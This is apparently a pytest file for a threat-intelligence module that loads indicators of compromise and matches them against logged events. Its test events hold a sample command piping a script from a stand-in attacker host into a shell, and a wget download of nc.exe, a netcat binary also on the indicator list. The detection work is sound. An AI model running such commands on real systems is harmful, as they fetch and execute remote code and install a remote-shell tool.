import json

from qlure.correlate.ioc import IOCSet, match_event

INDICATORS = {
    "indicators": [
        {"value": "198.51.100.7", "type": "ipv4-addr"},
        {"value": "evil.example", "type": "domain-name"},
        {"value": "nc.exe", "type": "file:name"},
        {"value": "d41d8cd98f00b204e9800998ecf8427e", "type": "file:hashes"},
    ]
}


def test_loads_the_handoff_indicator_format(tmp_path):
    path = tmp_path / "indicators.json"
    path.write_text(json.dumps(INDICATORS), encoding="utf-8")
    iocs = IOCSet.load(path)
    assert len(iocs) == 4


def test_matches_source_ip_and_command_text():
    iocs = IOCSet.from_indicators(INDICATORS)
    event = {
        "src_ip": "198.51.100.7",
        "request": {"command": "curl http://stage.evil.example/x.sh | sh"},
    }
    hits = match_event(event, iocs)
    kinds = {(h.indicator_type, h.field) for h in hits}
    assert ("ipv4-addr", "src_ip") in kinds
    assert ("domain-name", "request") in kinds


def test_matches_file_names_and_hashes_inside_payloads():
    iocs = IOCSet.from_indicators(INDICATORS)
    event = {
        "src_ip": "192.0.2.10",
        "request": {"command": "wget -O nc.exe http://h/x"},
        "response": {"body": "d41d8cd98f00b204e9800998ecf8427e"},
    }
    values = {h.value for h in match_event(event, iocs)}
    assert values == {"nc.exe", "d41d8cd98f00b204e9800998ecf8427e"}


def test_no_match_on_unrelated_event():
    iocs = IOCSet.from_indicators(INDICATORS)
    assert match_event({"src_ip": "192.0.2.10", "request": {"path": "/index.html"}}, iocs) == []
